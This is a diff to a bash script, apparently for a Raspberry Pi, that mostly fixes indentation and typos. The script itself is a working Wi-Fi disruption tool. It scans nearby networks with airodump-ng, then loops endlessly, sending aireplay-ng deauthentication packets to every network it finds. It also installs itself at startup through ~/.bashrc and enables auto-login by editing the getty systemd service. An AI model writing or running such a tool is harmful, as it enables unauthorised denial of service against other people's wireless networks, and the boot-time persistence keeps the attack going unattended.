@@ -45,14 +45,14 @@ print_menu()
 	echo
 	echo " Startup Menu - Make modifications for startup"
 	echo
-	echo "   0    Unistall any previous script"
+	echo "   0    Uninstall any previous script"
 	echo "   1    Enable auto-login"
-  echo "   2    Disable auto-login"
-  echo
-  echo " Modes Menu - Install an attack mode at startup"
-  echo
+	echo "   2    Disable auto-login"
+	echo
+	echo " Modes Menu - Install an attack mode at startup"
+	echo
 	echo "   3    Attack closest network only"
-	echo "   4    Attack everyone in the perimeter"
+	echo "   4    Disrupt the perimeter"
 	echo
 	echo -n "	Choose an option : "
 }
@@ -74,43 +74,43 @@ menu()
 	clear
 	case $option in
 
-    0 )
-      #remove startup entry
-      sed -i '/\/rasperish\/rasperi.sh/d' ~/.bashrc
-      #reset flag
-      sed '0,/flag=/s//flag=""/' "$PWD"/$0
-      ;;
-
+		0 )
+			#remove startup entry
+			sed -i '/\/rasperish\/rasperi.sh/d' ~/.bashrc
+			#reset flag
+			sed '0,/flag=/s//flag=""/' "$PWD"/$0
+		;;
+	
 		1 )
-      enable_autologin
-      menu
-      ;;
-
-		2 )
-      disable_autologin
-      menu
+			enable_autologin
+			menu
 			;;
-
-    3 )
-      echo
-      echo "		[!] Mode is work in progress. Not available."
-      sleep 1
-      menu
-
-      #set_flag closest
-      sed '0,/flag=/s//flag="closest"/' "$PWD"/$0
-      if [[ $(grep -o rasperi.sh) != "rasperi.sh" ]]; then
-        echo "/rasperish/rasperi.sh" >> .bashrc
-      fi
-  		;;
-
-    4 )
-      #set_flag haki
-      sed '0,/flag=/s//flag="haki"/' "$PWD"/$0
-      if [[ $(grep -o rasperi.sh) != "rasperi.sh" ]]; then
-        echo "/rasperish/rasperi.sh" >> .bashrc
-      fi
-  		;;
+	
+		2 )
+			disable_autologin
+			menu
+		;;
+	
+		3 )
+			echo
+			echo "		[!] Mode is work in progress. Not available."
+			sleep 1
+			menu
+	
+			#set_flag closest
+			sed '0,/flag=/s//flag="closest"/' "$PWD"/$0
+			if [[ $(grep -o rasperi.sh) != "rasperi.sh" ]]; then
+				echo "./rasperish/rasperi.sh" >> ~/.bashrc
+			fi
+			;;
+	
+		4 )
+			#set_flag haki
+			sed '0,/flag=/s//flag="haki"/' "$PWD"/$0
+			if [[ $(grep -o rasperi.sh) != "rasperi.sh" ]]; then
+				echo "./rasperish/rasperi.sh" >> ~/.bashrc
+			fi
+			;;
 
 
 		* )
@@ -119,7 +119,7 @@ menu()
 			sleep 1
 			menu
 			;;
-		esac
+	esac
 }
 
 set_flag()
@@ -129,20 +129,20 @@ set_flag()
 
 enable_autologin()
 {
-  cp /etc/systemd/system/getty.target.wants/getty@tty1.service /etc/systemd/system/getty.target.wants/getty@tty1.service.backup
+  cp /etc/systemd/system/getty.target.wants/getty@tty1.service /etc/getty@tty1.service.backup
   sed -i '/ExecService/c\"ExecService=-/sbin/agetty -a --noclear %I $TERM"' /etc/systemd/system/getty.target.wants/getty@tty1.service
 }
 
 disable_autologin()
 {
   rm /etc/systemd/system/getty.target.wants/getty@tty1.service
-  mv /etc/systemd/system/getty.target.wants/getty@tty1.service.backup /etc/systemd/system/getty.target.wants/getty@tty1.service
+  mv /etc/getty@tty1.service.backup /etc/systemd/system/getty.target.wants/getty@tty1.service
 }
 
 haki()
 {
 
-  #scan for n seconds
+	#scan for n seconds
 	scan 15
 
 	echo "	[i] Continuously attacking these networks... "
@@ -155,18 +155,18 @@ haki()
 		#get each corresponding channel for every essid found
 		channel=$(sed -n "${i}{p;q;}" /var/tmp/perish_dump/channels)
 
-    echo "	[+] Synchronising card to channel: $channel"
-    #sync the card to the victim's channel
-    iwconfig $interface channel $channel
+		echo "	[+] Synchronising card to channel: $channel"
+		#sync the card to the victim's channel
+		iwconfig $interface channel $channel
 
 		echo "	[+] Attacking $essid"
 		#send some deauth packets to each wifi network
-		 aireplay-ng -0 5 -e $essid $interface --ignore-negative-one > /dev/null 2>&1
+		aireplay-ng -0 5 -e $essid $interface --ignore-negative-one > /dev/null 2>&1
 
 		((i++))
 	done < /var/tmp/perish_dump/essids
 
-  #loop when you are done
+	#loop when you are done
 	haki
 }
 
@@ -182,7 +182,7 @@ start_mon()
 
 scan()
 {
-  scan_interval=$1
+	scan_interval=$1
 	timeout -k $scan_interval airodump-ng $interface --output-format kismet --write "/var/tmp/perish_dump/scan_data" > /dev/null 2>&1 &
 
 	awk -F "\"*;\"*" '{print $4}' /var/tmp/perish_dump/scan_data-01.kismet.csv | tail -n 2 > /var/tmp/perish_dump/bssids
@@ -190,5 +190,5 @@ scan()
 	awk -F "\"*;\"*" '{print $6}' /var/tmp/perish_dump/scan_data-01.kismet.csv | tail -n 2 > /var/tmp/perish_dump/channels
 }
 
-#Here starts the script and passes the flag arguement to it
+#Here starts the script and passes the flag argument to it
 main $flag
